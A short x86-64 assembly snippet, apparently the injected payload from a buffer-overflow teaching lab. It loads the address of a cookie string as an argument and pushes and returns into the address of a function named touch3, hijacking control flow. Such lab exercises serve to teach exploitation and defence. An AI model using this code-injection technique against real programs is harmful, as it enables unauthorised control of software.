sub $0x30, %rsp # protect
movq $0x5561dc78, %rdi # addr of cookie string
movq $0x4018fa, %rax # addr of touch3()
pushq %rax
retq